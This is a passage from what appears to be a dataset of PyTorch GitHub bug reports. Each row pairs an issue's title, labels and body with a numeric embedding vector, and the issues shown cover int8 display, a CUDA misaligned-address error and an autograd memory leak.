 -1.59358025e-01  7.36213848e-02 -1.81662574e-01 -9.87603217e-02
  3.71231318e-01  1.13140330e-01 -5.84217198e-02  6.40867278e-02
 -3.22297990e-01 -1.16556518e-01  1.07438713e-01 -1.24390975e-01
 -4.70566601e-01  8.91588032e-02 -2.95385927e-01 -1.65977091e-01
  2.61174113e-01  1.12388089e-01 -1.08752064e-01 -7.65669718e-03
 -2.71593750e-01  9.38884318e-02 -1.16042495e-01  4.86507595e-01
 -3.24763715e-01 -7.30441790e-03 -7.19102249e-02 -3.94232012e-02
 -5.05871892e-01 -1.33850262e-01  2.24805057e-01 -2.94541717e-01
 -2.27073789e-01  1.67918667e-01  3.78031313e-01 -3.10642421e-01
  1.71889901e-01  6.47628903e-02 -1.39229864e-01 -9.76740196e-02
  6.62926584e-02  4.26751003e-03  3.84589694e-02  2.94079661e-01
  4.14608300e-01  5.93805075e-01  3.58626842e-02 -4.58302721e-02
  4.29327898e-02 -2.18524877e-02 -1.05576560e-01 -5.04907221e-02
 -1.65214121e-01  1.53772265e-01 -9.31364596e-02 -1.41526893e-01
  4.44014430e-01  2.15273544e-01 -1.57991648e-01  2.50999629e-03
  3.74502718e-01 -2.84023762e-01  2.06776455e-01  2.71755636e-01
  3.30840766e-01  3.76155317e-01 -2.46792018e-01  2.29115933e-01
  5.15055060e-02  2.91184664e-01 -1.15546852e-01  3.23869675e-01
  3.19838047e-01 -6.42940640e-01 -1.23316765e-01 -2.37347320e-01
  3.79531607e-02 -5.89243054e-01  1.15551703e-01  3.30588818e-01
  2.38033697e-01 -1.81422569e-04  1.27816230e-01  3.52185607e-01
  2.35762402e-01  1.76309153e-01  1.06052205e-01  4.10583436e-01
 -7.21106604e-02 -2.54204631e-01 -3.53874147e-01  2.84817696e-01
 -4.37391639e-01 -1.41239494e-01  1.62767991e-01  1.87455028e-01
  6.37359843e-02  1.82559043e-01 -6.85362741e-02  1.85800359e-01
  4.52283025e-01  1.44941539e-01 -1.78531051e-01 -2.87644207e-01
 -2.29496330e-01  1.58833951e-01 -1.79347709e-01  7.94028342e-02
 -1.84793517e-01  3.41867059e-02  4.45504755e-01  3.86283427e-01
 -4.59533751e-01  1.68177381e-01 -4.06251341e-01 -5.23515083e-02
 -1.20028816e-01  8.78779590e-02 -1.25396967e-01 -4.74608809e-01
  3.57295662e-01 -3.23319435e-03 -3.47854376e-01  9.61442143e-02
  4.83028218e-02 -4.77407694e-01  1.02506708e-02 -3.17577839e-01
 -5.47832727e-01  3.27103324e-02  2.35862136e-01  1.61210690e-02
  2.72454202e-01  6.59587830e-02  5.46234369e-01 -2.07969576e-01
  1.04089722e-01  2.06036381e-02  2.09368885e-01  4.58545871e-02
  1.59913022e-03 -2.06192374e-01 -1.62535787e-01  1.18234288e-03
 -5.53952813e-01  2.27524787e-01 -1.91026866e-01 -1.38998181e-01
 -3.26301157e-01 -5.60571104e-02 -4.27147374e-02 -1.08634740e-01
 -1.43769041e-01 -3.44317526e-01 -1.49456084e-01 -6.46252483e-02
  4.63241786e-01  1.90136045e-01  2.28521317e-01 -6.93182424e-02
  9.05167609e-02 -1.75095797e-01  4.28693831e-01 -7.42047206e-02
  7.58880973e-02 -3.10184956e-01 -5.11026561e-01 -3.95287216e-01
  5.70480108e-01 -1.33014545e-02 -1.04812412e-02  1.78693920e-01
 -6.05026744e-02 -3.24233919e-01  2.14810878e-01 -2.79273957e-01
  3.41411740e-01  9.86062437e-02 -2.38443792e-01 -6.06583804e-02
  9.59881246e-02  1.75556242e-01 -2.99722314e-01 -4.23338234e-01
 -4.30033624e-01  7.05666542e-02 -3.36260684e-02 -5.65214753e-01
 -2.55339384e-01 -1.73000425e-01 -1.66973144e-01 -2.82910168e-02
 -3.61721277e-01  2.17319474e-01  1.05316788e-01  2.63248444e-01
  3.17476988e-01  1.95189714e-01 -1.92180678e-01 -2.59120584e-01
 -2.66588688e-01  5.21675050e-01 -8.84726718e-02 -1.71660021e-01
 -2.54404843e-01  7.42984116e-02 -4.62519228e-02 -3.83084178e-01
  7.20432848e-02 -8.92540663e-02 -5.02603464e-02  2.66792357e-01
  6.15876839e-02 -1.56858534e-01 -2.51775265e-01 -8.83387327e-02
  1.47704571e-01 -1.52229950e-01  1.18271179e-01 -1.26955405e-01
  5.62642775e-02 -3.29956174e-01 -2.98950762e-01  1.51145384e-01
 -9.25925672e-02  3.72384310e-01  1.58985883e-01 -1.23040900e-01
 -1.65771067e-01  3.45316529e-02  2.50994205e-01  4.50139731e-01
 -2.09838599e-02 -9.40970611e-04  9.92447883e-02 -1.57458723e-01
  1.68347806e-02  9.04669613e-02  8.89693648e-02  2.43113026e-01
  4.26805079e-01  1.73567180e-02 -1.36756137e-01 -7.28983879e-02
  1.99433714e-01 -3.01125795e-01 -9.04011875e-02 -1.09454967e-01
  5.21613300e-01  5.67270964e-02  9.70481038e-02  4.43986207e-02
  2.88686037e-01 -1.92137465e-01  2.85213768e-01 -1.29916757e-01
  3.52419108e-01  3.79329100e-02  1.54447764e-01 -2.93917023e-02
  2.83304393e-01 -2.78789431e-01 -1.47562966e-01 -1.22501224e-01
 -7.08305985e-02  1.65983170e-01 -1.50325699e-02 -5.38364172e-01
  4.81365561e-01  2.36000463e-01 -4.18538600e-01  2.52744526e-01
  1.89089417e-01 -4.13340926e-01  3.21860686e-02 -2.25562781e-01
  6.09692819e-02  3.26332867e-01  6.07088730e-02 -1.71997741e-01
  4.76083905e-02  5.03220595e-02  2.09870800e-01 -4.83244248e-02
  3.06152821e-01 -3.56658280e-01  1.42965734e-01  5.76800331e-02
 -8.63108784e-02  1.60783976e-02 -2.90352225e-01  1.14435166e-01
 -2.21203193e-01  3.02036703e-01  3.36868882e-01 -4.60516885e-02
 -6.00586236e-02 -3.19993764e-01  1.45489737e-01  8.31376985e-02
 -1.22853093e-01  1.67768180e-01 -1.85403317e-01  1.64494231e-01
  1.58080071e-01 -2.18095765e-01  7.46457800e-02 -3.76795605e-02
  4.90731180e-01  2.90142715e-01 -2.88265526e-01 -2.06103444e-01
 -1.49948075e-01  2.14823201e-01 -1.26179218e-01 -1.41257197e-01
 -2.58029044e-01  2.70051211e-02 -4.80196849e-02 -1.10174842e-01
  7.59442225e-02  2.92042661e-02  1.87279299e-01  2.28624180e-01
  1.14202544e-01 -2.22077250e-01 -3.65059413e-02  4.68971767e-03
 -2.75903605e-02  1.10975944e-01 -2.17838883e-01  3.07600617e-01
  1.31979167e-01  1.01628214e-01 -4.68459725e-02  2.60468394e-01
  3.00001383e-01  5.19227266e-01 -3.54409814e-01 -1.36225834e-01
  1.71384424e-01  1.70333795e-02  2.67544836e-01 -8.99257213e-02
 -2.05053106e-01  4.42901880e-01  1.81915715e-01  1.25404194e-01
  1.09531961e-01  2.03722298e-01  1.99943796e-01 -1.94675744e-01
  2.60913372e-01 -7.35906288e-02  2.72927582e-02  2.12088041e-02
  5.48176393e-02  1.39724702e-01 -3.46592754e-01 -9.28414762e-02]"
Display of negative int8 tensor values triaged module: arm,"## ðŸ› Bug

Display of int8 matrix seems broken. 

## To Reproduce

```
>>> import torch
>>> a = torch.tensor([1, -10], dtype=torch.int8)
>>> a[1]
tensor(-10, dtype=torch.int8)
>>> a
tensor([  1, 246], dtype=torch.int8)
```

## Expected behavior

I expect the tensor to be written as ` tensor([  1, -10], dtype=torch.int8)`

This works fine on pytorch 1.7.1 on x64.

## Environment
```
(pytorch_venv) matthijs@ip-10-100-175-26:~/efficient-deit/deit_lite$ python collect_env.py
Collecting environment information...
PyTorch version: 1.8.0.dev20201210
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (aarch64)
GCC version: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2

Python version: 3.8 (64-bit runtime)
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.0
[pip3] torch==1.8.0.dev20201210
[pip3] torchvision==0.2.2.post3
[conda] Could not collect
```
## Additional context

<!-- Add any other context about the problem here. -->
",True,"[-2.20444560e-01 -6.07439578e-01 -3.48183572e-01 -3.39081883e-02
 -1.98480383e-01 -3.94792199e-01 -4.36049029e-02 -7.42718875e-02
 -5.10486603e-01 -3.42252314e-01 -4.10492308e-02  1.35321826e-01
 -5.04473388e-01  1.75682157e-01 -1.22341350e-01 -1.53354108e-01
 -2.26804435e-01 -4.24359292e-02 -1.82397723e-01  5.77511676e-02
  4.69197482e-02 -1.22947901e-01 -3.73458564e-01  2.46198386e-01
 -4.11495976e-02  1.77601114e-01 -2.67771576e-02 -9.35376808e-02
  3.56506526e-01 -2.70909704e-02  3.55338216e-01 -9.22158360e-02
 -1.27239764e-01  3.10331225e-01 -1.80628061e-01  3.03669482e-01
 -4.21208650e-01  1.30037507e-02 -1.05275899e-01  1.18667863e-01
  2.36695319e-01  2.88533866e-01  1.34669608e-02 -2.04227030e-01
  1.78588703e-01  1.10126391e-01  8.65398198e-02 -1.10920444e-01
  4.46189195e-02 -2.76370347e-01  4.62565348e-02  1.14391148e-01
 -2.77534336e-01 -3.24040323e-01  3.74377072e-02 -3.60130817e-01
  2.62859073e-02 -3.73060614e-01 -1.84168845e-01 -4.48922992e-01
  6.83813393e-02 -1.81586117e-01  1.53115049e-01  3.03227305e-02
  1.22002862e-01  1.93547219e-01  5.38140893e-01  2.20184401e-02
  5.71328819e-01  2.16836303e-01  3.09525162e-01  1.32434249e-01
 -2.29442909e-01  1.68014973e-01 -9.33552235e-02  4.10574198e-01
  9.58315432e-02  3.35430533e-01  1.83571398e-01 -2.06796318e-01
  2.07989112e-01  5.49002662e-02  2.21014053e-01 -2.84073532e-01
  1.47802696e-01  1.59760788e-01  4.87116724e-01 -5.87382540e-02
  5.15937328e-01 -1.40156597e-01  4.33990061e-01  1.65664047e-01
 -4.69631582e-01 -1.56320229e-01  2.93452144e-01  1.44170195e-01
  5.40828288e-01  1.18888937e-01 -2.47098446e-01 -2.09901422e-01
 -3.94195557e-01 -2.05342531e-01 -1.58314377e-01 -9.82870348e-03
  1.52405649e-01  2.79147089e-01  8.90306681e-02 -1.47062466e-01
  2.22914368e-02 -1.57498002e-01  4.16652858e-01 -2.04678848e-01
  3.26411545e-01  1.29891336e-01 -2.10440636e-01 -1.55953392e-01
  9.54849366e-03  1.20136365e-01  5.54330535e-02  6.09169602e-01
 -2.03595459e-01  2.24559996e-02  3.87803257e-01  5.88811815e-01
  3.36726189e-01  7.67765269e-02 -2.98326373e-01 -1.45867229e-01
  2.51435582e-02  1.15827546e-02  4.19502318e-01 -3.21623266e-01
 -1.41011626e-01  2.55816400e-01  8.03205818e-02  8.68306682e-03
 -2.20048770e-01 -1.04810938e-01 -5.20925403e-01 -9.04593989e-02
 -1.39505640e-01  1.73385113e-01 -4.64328706e-01 -2.42022514e-01
  4.16158974e-01 -1.13835864e-01 -3.90056521e-01 -1.79938123e-01
 -1.86736584e-02  2.45234087e-01 -2.51408458e-01  2.34534219e-01
 -2.04336762e-01  2.87312537e-01  1.22910954e-01  9.94672030e-02
 -2.60316320e-02 -2.38266468e-01 -8.66666809e-02 -6.55586660e-01
  3.57327461e-01  5.06771684e-01  4.06126194e-02 -1.31255001e-01
  3.25162113e-01  4.60336506e-01 -2.85446584e-01 -1.08871937e-01
 -1.80468172e-01  4.17399526e-01  2.18504630e-02 -1.28155462e-02
 -2.78269351e-01  3.44336033e-01  5.17031431e-01 -1.99372590e-01
  9.51036811e-02 -1.03126526e+00 -5.67660779e-02  2.58282721e-01
  3.15922230e-01  1.05452314e-02  4.57759440e-01  5.88717423e-02
 -6.70561120e-02 -6.43630698e-03  1.70353621e-01 -5.35377003e-02
 -6.54996783e-02 -1.57639794e-02 -6.96929097e-02 -3.37243170e-01
 -2.14220613e-01  1.13591284e-01 -1.28185436e-01  1.91427052e-01
  5.29467762e-02 -2.34327704e-01 -1.87584013e-01  8.09478462e-02
 -3.54861170e-01 -3.56490910e-01 -7.01068863e-02  1.43462315e-01
  2.25863725e-01 -6.01856589e-01 -1.26592070e-01 -2.79187560e-01
 -4.51664180e-01  3.25257570e-01 -2.98053212e-03 -1.63969979e-01
  8.24101418e-02 -2.73019820e-03 -1.99423835e-01 -2.70077884e-01
  1.48850918e-01 -2.31965736e-01 -2.96828836e-01  3.56419206e-01
  3.28636944e-01 -1.22405685e-01 -1.79270189e-03 -2.33029485e-01
 -1.90656364e-01 -1.22567520e-01 -4.53532636e-01 -3.39745998e-01
 -3.00625414e-01  2.35795006e-02  2.20495403e-01  8.54943693e-03
  1.64517820e-01  6.97249547e-02  4.17190373e-01  2.70682722e-02
 -4.31308746e-01 -2.22668469e-01  3.57386135e-02  8.74115080e-02
 -3.50381941e-01  1.47315115e-01  1.31793976e-01 -2.96046287e-01
 -1.55683354e-01  4.75997269e-01  1.01864394e-02 -1.07946455e-01
 -3.13293517e-01  2.85543442e-01  5.04129007e-02  1.17685601e-01
  8.77030343e-02  2.83546839e-02  4.42559183e-01  1.48987258e-02
  3.55201215e-01  4.74411994e-01  5.41880615e-02  1.81633919e-01
  5.28346002e-01  1.11628868e-01 -9.10821930e-02  3.47412527e-01
  1.22112036e-01  3.18844140e-01 -6.71453029e-02  6.68677807e-01
  1.02432799e-02 -6.09820038e-02 -1.46750957e-01  1.49099931e-01
  3.85898262e-01 -5.16028762e-01 -2.15518594e-01 -6.07656062e-01
  3.71526450e-01  9.70896930e-02 -2.82083213e-01 -2.81401604e-01
  2.58088440e-01  8.38777646e-02 -1.59756437e-01  3.64290357e-01
  4.29832339e-02 -5.02632022e-01  1.82701759e-02 -1.41605392e-01
 -2.13908777e-03  2.86190640e-02 -6.12026036e-01 -7.27646127e-02
  3.17809373e-01 -2.08876193e-01 -1.73753023e-01  2.54109293e-01
  3.41433063e-02  7.40251988e-02 -2.28816926e-01  1.22457117e-01
  6.54836930e-03  1.03060864e-02  3.56476724e-01 -5.82858920e-01
 -1.51102263e-02 -2.38952249e-01  2.97184408e-01  2.34826207e-01
  3.25270593e-01 -1.64522499e-01  1.59062520e-01 -8.94494206e-02
 -3.26407254e-01  4.27932829e-01 -6.17128611e-02  6.34874851e-02
 -8.34040865e-02  8.87821198e-01  3.12772483e-01 -6.25508875e-02
 -5.66621199e-02 -2.92391598e-01 -1.47960633e-01 -7.81831741e-02
 -2.60921061e-01  4.34483215e-03 -2.36732408e-01 -1.41228482e-01
 -1.92162573e-01  3.99350524e-02 -1.56191140e-01 -3.72606933e-01
 -1.35588661e-01  1.34853050e-01  4.58118506e-04 -2.80334532e-01
 -3.35455835e-01  3.81886154e-01  3.22915763e-02 -3.67901504e-01
 -6.15837798e-02 -1.51750892e-01 -1.17123485e-01 -4.09202665e-01
  5.73628582e-04 -4.72822726e-01  5.74679613e-01  2.62849689e-01
 -1.48338541e-01  1.94069728e-01 -2.06977651e-01  3.29901755e-01
  3.74048501e-02  3.76931578e-01  3.39609504e-01  5.70416987e-01
 -6.94750575e-03  3.72339785e-02 -5.02014682e-02  5.02359748e-01
 -8.10351446e-02  1.20792925e-01 -5.22449613e-01 -1.16926901e-01
  4.83413517e-01 -2.71777779e-01  2.61429518e-01 -1.39089659e-01
  5.06164014e-01  5.15020728e-01 -4.06891257e-02  4.13506240e-01
 -7.64069483e-02  4.46518660e-01  5.92828453e-01 -7.12054729e-01
 -5.72364330e-01  1.94011137e-01  2.29963213e-01 -1.68679789e-01
  3.92909467e-01 -9.24374908e-04 -1.05133519e-01 -2.98350845e-02]"
CUDA error: misaligned address on CUDA 11.2 on Windows on torch.where complex128 module: windows module: cuda triaged,"## ðŸ› Bug

Discovered in https://github.com/pytorch/pytorch/pull/51598, the failing test is `test_where_scalar_valid_combination_cuda_complex128 `

Minumum repro is:

```python
import torch

x = torch.randn(5, 5, 5, dtype=torch.cdouble, device='cuda')
cond = torch.zeros_like(x, dtype=torch.bool)
torch.where(cond, x, complex(0.0))
```

Fails with

```python
Traceback (most recent call last):
  File ""test/where.py"", line 5, in <module>
    torch.where(cond, x, complex(0.0))
RuntimeError: CUDA error: misaligned address
```

## Environment

```
Collecting environment information...
PyTorch version: 1.8.0a0+dac730a
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Microsoft Windows 10 Enterprise
GCC version: Could not collect
Clang version: Could not collect
CMake version: version 3.17.0-rc1

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: GeForce RTX 3090
GPU 1: GeForce RTX 2080 Ti

Nvidia driver version: 461.40
cuDNN version: C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.2\bin\cudnn_ops_train64_8.dll
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.18.1
[pip3] torch==1.8.0a0+dac730a
[conda] Could not collect
```

cc @ngimel @peterjc123 @maxluk @nbcsm @guyang3532 @gunandrose4u @mszhanyi @skyline75489 @janeyx99 @ptrblck @xwang233 ",True,"[-0.30165753 -0.14422919 -0.56161785  0.36338288 -0.13837132 -0.25114802
 -0.37757096  0.17151864 -0.23508662 -0.28256732 -0.02902506 -0.47157064
 -0.19933513 -0.10774142 -0.21696712 -0.08389457 -0.15471111  0.01735245
 -0.15506434 -0.02019081 -0.12378217  0.04115907 -0.36173505 -0.1663549
  0.26948276 -0.05780657 -0.11286305 -0.1539981   0.4363814  -0.04765926
  0.15466888 -0.00163775 -0.31863773  0.26503146  0.2533888  -0.3436219
 -0.4891865  -0.27772698 -0.01115718 -0.32538867  0.02655979  0.06270209
  0.03347362  0.07423031 -0.16582572 -0.10443867  0.07582705  0.25178427
 -0.29985556 -0.07946816  0.04294528  0.11962582  0.17965034 -0.25583753
  0.01684359 -0.21766627 -0.2062276   0.12048718  0.10018203 -0.14015988
  0.4469822  -0.07490474 -0.03285813 -0.19261302 -0.15876837  0.02842336
 -0.252564   -0.09218998  0.51828134 -0.16634259  0.12459354  0.09226595
 -0.13780355 -0.11807542  0.04154961  0.16372058 -0.03723149  0.12470597
 -0.18982919  0.11980681  0.35861534  0.3052749   0.05940738 -0.18508735
  0.32093772 -0.10631573  0.25129154 -0.2751277   0.15999806 -0.22843724
  0.47541445  0.22084413 -0.06366874  0.27957797 -0.04397795 -0.10007235
  0.16652268 -0.11652307 -0.39673722 -0.3946677  -0.16440839 -0.24855292
 -0.23139754  0.56283015 -0.10782079 -0.18439949  0.07843114  0.3028832
  0.132286   -0.1845073   0.45123702 -0.01515388 -0.06271416 -0.01353916
  0.10995811  0.01520441 -0.56474495 -0.11078897 -0.09659901  0.13279836
 -0.41160345 -0.09549385 -0.05061127 -0.18586282  0.2231522   0.12177412
 -0.12163582  0.01424601 -0.1518738   0.08019578 -0.00422163 -0.02875032
  0.41182366 -0.20313916  0.16621283  0.38056144 -0.49436024  0.06233113
 -0.22684956 -0.06243907 -0.198211    0.24775517 -0.17993088 -0.23908135
  0.10110649 -0.04927402 -0.27896124  0.06889856  0.1250633   0.40271994
  0.1987583   0.06864081 -0.67436904  0.49523875 -0.02121218  0.15297209
  0.30817324 -0.03831148  0.11177406 -0.3992011   0.4261964   0.3701728
  0.29956996  0.38540363  0.05798968 -0.03197899 -0.31909582  0.10564357
 -0.01686755  0.2793692  -0.08784099 -0.08568502  0.4156266  -0.09159423
  0.09100892 -0.15436198 -0.11648113  0.02039302 -0.01606416  0.6666071
 -0.05191436  0.4658168   0.57581186  0.02715622  0.16021761  0.53759426
  0.51665026  0.11338048 -0.39094275 -0.1733468  -0.3037741  -0.11570532
 -0.10817177 -0.26592067 -0.18465903  0.24841319  0.18269652 -0.06372425
  0.09043932  0.09753925 -0.3216344   0.18524802  0.25786823  0.07222572
 -0.16330528  0.03873322 -0.04519919 -0.22129685 -0.06229     0.19406074
 -0.33308804 -0.14862308 -0.4560035  -0.12599868 -0.07810447  0.29100823
  0.1688452  -0.1466571  -0.03210125  0.43115062  0.44514123 -0.13147011
  0.10499164 -0.15412101  0.19404061 -0.2205657  -0.1296916  -0.0696114
 -0.13522117 -0.0798136  -0.12062335 -0.24286449 -0.02432199  0.06623566
  0.19671786  0.21475588  0.09657649 -0.278282    0.07876315  0.2284599
 -0.2623798   0.0793824  -0.11152916  0.10728578  0.02690138  0.29897466
 -0.07405601 -0.08403346 -0.30432203 -0.1696131   0.46858016 -0.4346735
 -0.0753376  -0.11893397  0.19329007  0.10187349  0.17673996  0.09312014
 -0.13863072  0.05878538  0.37842447  0.1628694  -0.21550559 -0.05552988
  0.22832435  0.2745126  -0.26772058  0.38570774 -0.14102405  0.0979794
  0.10634905 -0.18644345  0.3006955  -0.05393304  0.33271363 -0.44033843
  0.49403894 -0.15250742  0.0280019  -0.1972838   0.45970488  0.12523785
  0.09252906  0.29480058  0.41671222 -0.29632354 -0.24333668  0.0472087
 -0.11515242 -0.14104372 -0.26066512  0.08994626  0.21208012 -0.15909642
 -0.41152248 -0.03794826  0.23024036 -0.09845607  0.02487574 -0.03859933
 -0.42360878  0.27397972  0.11798776 -0.4152956  -0.3401491  -0.3310513
  0.0811341   0.05712422  0.61776155 -0.31877834  0.14708766  0.0390177
 -0.08558093  0.3821633  -0.06922677 -0.03385958  0.06452394  0.11990151
  0.39688653  0.0635768  -0.14665641 -0.47671676 -0.52417576 -0.04477843
  0.09208989  0.2954638  -0.4412437   0.28618562  0.04107928  0.55116177
  0.18894161  0.07087809  0.03897431  0.07827118 -0.22686014  0.08178572
 -0.10575515  0.05099283  0.36864054 -0.21408552 -0.25298786 -0.12531081
  0.12939534 -0.22504355 -0.19613513 -0.1391837   0.17748785  0.40308464
  0.04451743 -0.14806217 -0.03723593  0.00753739  0.03122609  0.04713055
  0.06073707  0.5850667   0.44013003  0.1667227   0.15708025 -0.03108958
  0.10082453  0.21215315 -0.27716368 -0.34858704  0.06931527 -0.05238054
 -0.38068154 -0.04547156  0.06855498 -0.04544627 -0.591637    0.18222307
 -0.09897766  0.03044548  0.3892885  -0.1971154  -0.20402156 -0.07563044
  0.02783814  0.22560185  0.44414622  0.07842457  0.22006485 -0.19190747]"
autograd.grad with set_detect_anomaly(True) will cause memory leak module: autograd module: memory usage triaged,"## ðŸ› Bug

using `torch.autograd.grad()` with `torch.autograd.set_detect_anomaly(True)` will cause memory leak

## To Reproduce

Run the code snippet below.
It will have about 2MiB GPU memory consumption increasing each iteration.

If comment out the `set_detect_anomaly` line, then there is no memory leak, with constant memory consumption.

```python
import torch
torch.autograd.set_detect_anomaly(True) # if comment out this, no leak
for rep in range(1000):
    batch = torch.ones(10, 30000).cuda().requires_grad_()
    y=batch.norm()
    grad = torch.autograd.grad(
        outputs=y, inputs=batch,
        create_graph=True, retain_graph=True, only_inputs=True)[0]
    print(""memory allocated:"", float(torch.cuda.memory_allocated()/1024**2), ""MiB"")
    pass
```

## Expected behavior

No memory leak with or without `set_detect_anomaly(True)`

## Environment

 - PyTorch Version: 1.7.1
 - OS: Linux
 - How you installed PyTorch: conda, source: `-c pytorch`
 - Python version: 3.8.5
 - CUDA/cuDNN version: cuda11.0

## Additional context

BTW, if replace `y=batch.norm()` with `y=batch.mean()`, then there is no memory leak with or without `set_detect_anomaly`, which makes me very confused.


cc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @soulitzer",True,"[-3.38792741e-01 -1.22008704e-01 -2.36467317e-01 -1.39495149e-01
  1.94104046e-01 -1.19353294e-01 -1.21814430e-01  3.23807776e-01
 -4.42842036e-01 -2.71123409e-01 -1.29196435e-01  6.68946952e-02
 -1.68749094e-02  9.83857587e-02 -2.93397635e-01  4.06464376e-03
 -1.14709236e-01 -3.75008821e-01  1.54160395e-01 -2.66376317e-01
  1.64186597e-01 -2.23463848e-01 -1.16131574e-01  1.69755176e-01
 -3.57776433e-02  3.79444957e-01  2.30029002e-01 -3.20249528e-01
  1.51212662e-01  2.35741697e-02 -5.67366146e-02 -1.10339925e-01
 -2.70616651e-01 -6.93911538e-02  5.49063981e-01 -3.31311673e-02
 -3.83300126e-01 -1.67647079e-01  6.38389885e-02 -1.27337828e-01
  1.52380899e-01 -3.00474185e-02  7.39157200e-02  1.01064920e-01
  2.91534979e-02  4.60131168e-02 -1.32426068e-01  2.53865480e-01
 -3.99262220e-01 -1.44093782e-01  2.85719663e-01  1.06237873e-01
 -3.60631756e-02 -1.95878297e-01 -8.67056102e-03 -1.99744999e-01
 -6.77732080e-02 -1.62070751e-01 -8.17485601e-02 -7.44051114e-03
  1.74052417e-01  1.24760024e-01  6.32176697e-02 -1.62425488e-01
 -1.96879521e-01 -2.22842526e-02  1.27913475e-01  1.17239811e-01
  6.15879238e-01  1.99654520e-01  4.68841232e-02  5.72921298e-02
 -4.13323939e-01 -3.54455449e-02  1.84272364e-01 -8.77899081e-02
 -3.95930529e-01 -1.55992031e-01 -1.08262986e-01 -3.71300101e-01
  1.82805546e-02  9.02645588e-02  7.80711994e-02 -5.31932861e-02
  1.81872159e-01 -5.15112653e-02  3.55114222e-01 -7.63124377e-02
  2.20263779e-01  4.09607410e-01  1.15856513e-01 -4.77555633e-01
  4.84783798e-02  2.98555791e-01 -7.74028450e-02  4.67286482e-02
  8.81391764e-02 -2.67724097e-02  8.81834701e-03 -1.51242405e-01
  1.63689423e-02 -3.08874846e-01 -2.36920342e-02  2.60683328e-01
  2.49419838e-01 -8.42006356e-02  2.77109295e-01  5.44241071e-01
  1.06943473e-01 -3.63892674e-01  3.25369477e-01  3.67280245e-02
  2.57925242e-01  2.62320079e-02 -2.14526653e-02 -6.62728958e-03
 -3.32179606e-01 -3.53689827e-02 -3.11687529e-01  4.83678639e-01
  3.97862643e-02  2.73285836e-01  1.90951496e-01  2.89297909e-01
  1.36643097e-01 -2.87415106e-02 -1.70175701e-01  5.02924062e-02
  5.90409152e-04 -3.06953818e-01 -9.75428373e-02 -1.83498636e-01
 -2.47175127e-01  3.66208516e-02  1.35726765e-01  5.17989814e-01
 -1.50745839e-01 -9.88913700e-03  1.41257644e-01 -3.41823280e-01
 -2.18717203e-01 -3.60241160e-02  1.44127905e-01  4.79547754e-02
 -2.91310251e-01  7.79719353e-02 -1.03923939e-02  4.81331408e-01
  1.46235138e-01 -1.73732996e-01  1.91633813e-02 -2.26025924e-01
 -7.32728601e-01  4.51794654e-01 -1.81697756e-02 -1.77633464e-02
  2.73130774e-01  1.12989649e-01  3.89180303e-01 -2.27799237e-01
  4.08900306e-02  4.24279153e-01  1.24972209e-01 -1.28887713e-01
  4.07826722e-01  3.36356834e-02 -2.21186042e-01 -8.20786431e-02
 -2.01727301e-01  2.38676056e-01  2.45254889e-01 -9.31287855e-02
  1.04265876e-01 -2.29737386e-01  2.65482545e-01 -3.20595711e-01
  5.26917577e-02 -2.45116517e-01 -1.08985208e-01  1.02347270e-01
  1.51447773e-01  2.48887464e-01  1.14805073e-01  2.35589415e-01
  1.22704402e-01  1.50213569e-01  4.39407408e-01  1.00612119e-01
 -5.35086952e-02  5.49105927e-03 -4.29168403e-01 -1.78295046e-01
 -2.30703801e-02 -1.08690262e-01  6.02169186e-02 -1.65019669e-02
 -9.26974714e-02 -4.43246663e-02 -1.37110442e-01 -2.12091237e-01
 -3.14412504e-01  6.71671927e-02 -2.01852441e-01 -2.64608692e-02
  3.31697702e-01  3.60415012e-01 -6.39754236e-01 -1.54615909e-01
 -1.71525031e-01 -2.34699145e-01  1.02282777e-01 -4.00690973e-01
 -3.66748869e-01 -5.96425422e-02 -9.42786485e-02 -2.04184890e-01
 -4.37204018e-02  1.23432148e-02  2.64827013e-01  3.56184393e-01
  2.36225456e-01  2.55509019e-01 -2.75016010e-01 -1.45617455e-01
  1.31013781e-01 -4.04278785e-02 -2.95418687e-02 -8.83647799e-02
  4.36574593e-03  4.84559685e-02 -1.01827294e-01  1.99191496e-02
 -5.13599515e-02 -4.19465452e-02  7.26543218e-02  5.62239707e-01
  8.85022879e-02 -9.81995240e-02 -3.16615522e-01  7.46288374e-02
 -2.22117230e-02 -1.29376739e-01 -6.71389922e-02  8.97440463e-02
 -1.01850182e-01  1.57906368e-01 -6.28798604e-02 -1.89626336e-01
 -3.28496695e-02  9.57945734e-02 -1.86931998e-01  1.22319698e-01
 -9.96533781e-02 -1.34608924e-01  4.70230877e-01  3.57328415e-01
 -1.72306985e-01  7.92586207e-02 -1.75779164e-01 -4.77485627e-01
  1.09006219e-01  2.16062903e-01 -1.80555925e-01  8.49567354e-02
  2.83080757e-01  1.06700718e-01 -3.46410602e-01  1.11490577e-01
 -6.12563118e-02  7.42602348e-02  5.80503866e-02 -2.96103656e-01
  5.54945111e-01  3.60588640e-01  4.49815765e-02 -1.64027274e-01
  3.88387889e-01 -1.88077390e-01  1.32934406e-01 -3.40875149e-01
  3.08252215e-01  1.67029589e-01 -9.83722359e-02  1.82849765e-01
  2.79996991e-01 -6.42046556e-02  1.58464402e-01 -2.15168551e-01
 -9.04900730e-02 -2.14874446e-01 -2.23821372e-01  2.09178254e-01
  3.83179486e-01  8.90266448e-02  1.42357573e-02  1.78104386e-01
 -2.28031382e-01 -1.26462966e-01  9.42908674e-02  6.08113408e-02
 -5.89036584e-01  2.25840107e-01  2.39530519e-01  5.68241179e-02
 -4.74494338e-01  6.05484843e-02  2.10881040e-01  2.15766393e-02
  5.08916020e-01 -2.70752758e-01  1.28668934e-01  6.93778321e-03
 -1.52016103e-01  3.33133265e-02 -1.86988086e-01  4.87272069e-02
 -3.73582482e-01 -6.28383830e-02  9.76527110e-02  4.19589505e-03
 -7.03203231e-02 -1.75682455e-01 -1.31822973e-02  2.59636313e-01
